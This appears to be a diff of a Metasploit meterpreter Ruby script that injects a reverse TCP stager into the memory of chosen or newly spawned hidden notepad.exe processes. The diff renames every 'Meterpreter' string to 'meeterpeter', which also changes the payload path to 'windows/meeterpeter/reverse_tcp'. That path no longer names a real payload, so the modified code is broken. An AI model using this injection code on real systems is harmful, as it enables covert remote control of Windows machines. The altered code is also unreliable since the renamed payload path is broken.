@@ -1,5 +1,5 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -16,13 +16,13 @@ lhost    = "127.0.0.1"
 pid = nil
 multi_ip = nil
 multi_pid = []
-payload_type = "windows/meterpreter/reverse_tcp"
+payload_type = "windows/meeterpeter/reverse_tcp"
 start_handler = nil
 @exec_opts = Rex::Parser::Arguments.new(
   "-h"  => [ false,  "Help menu." ],
   "-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4444)."],
   "-m"  => [ false,  "Start exploit/multi/handler for return connection."],
-  "-pt" => [ true,   "Specify reverse connection Meterpreter payload. Default: windows/meterpreter/reverse_tcp"],
+  "-pt" => [ true,   "Specify reverse connection meeterpeter payload. Default: windows/meeterpeter/reverse_tcp"],
   "-mr" => [ true,   "Provide multiple IP addresses for connections separated by comma."],
   "-mp" => [ true,   "Provide multiple PID for connections separated by comma one per IP."]
 )
@@ -33,24 +33,24 @@ meter_type = client.platform
 # Usage Message Function
 #-------------------------------------------------------------------------------
 def usage
-  print_line "Meterpreter script for injecting a reverce tcp Meterpreter payload"
+  print_line "meeterpeter script for injecting a reverce tcp meeterpeter payload"
   print_line "in to memory of multiple PIDs. If none is provided, a notepad process"
-  print_line "will be created and a Meterpreter payload will be injected in to each."
+  print_line "will be created and a meeterpeter payload will be injected in to each."
   print_line(@exec_opts.usage)
   raise Rex::Script::Completed
 end
 
-# Wrong Meterpreter Version Message Function
+# Wrong meeterpeter Version Message Function
 #-------------------------------------------------------------------------------
 def wrong_meter_version(meter = meter_type)
-  print_error("#{meter} version of Meterpreter is not supported with this script!")
+  print_error("#{meter} version of meeterpeter is not supported with this script!")
   raise Rex::Script::Completed
 end
 
 # Function for injecting payload in to a given PID
 #-------------------------------------------------------------------------------
 def inject(target_pid, payload_to_inject)
-  print_status("Injecting meterpreter into process ID #{target_pid}")
+  print_status("Injecting meeterpeter into process ID #{target_pid}")
   begin
     host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
     raw = payload_to_inject.generate
@@ -60,7 +60,7 @@ def inject(target_pid, payload_to_inject)
     print_status("Writing the stager into memory...")
     host_process.memory.write(mem, raw)
     host_process.thread.create(mem, 0)
-    print_good("Successfully injected Meterpreter in to process: #{target_pid}")
+    print_good("Successfully injected meeterpeter in to process: #{target_pid}")
   rescue::Exception => e
     print_error("Failed to Inject payload to #{target_pid}!")
     print_error(e)
@@ -87,7 +87,7 @@ end
 # Function for creating the payload
 #-------------------------------------------------------------------------------
 def create_payload(payload_type,lhost,lport)
-  print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
+  print_status("Creating a reverse meeterpeter stager: LHOST=#{lhost} LPORT=#{lport}")
   payload = payload_type
   pay = client.framework.payloads.create(payload)
   pay.datastore['LHOST'] = lhost
@@ -98,7 +98,7 @@ end
 # Function starting notepad.exe process
 #-------------------------------------------------------------------------------
 def start_proc()
-  print_good("Starting Notepad.exe to house Meterpreter session.")
+  print_good("Starting Notepad.exe to house meeterpeter session.")
   proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
   print_good("Process created with pid #{proc.pid}")
   return proc.pid
@@ -121,7 +121,7 @@ end
   end
 }
 
-# Check for version of Meterpreter
+# Check for version of meeterpeter
 wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
 # Create a exploit/multi/handler if desired
 create_multi_handler(payload_type) if start_handler
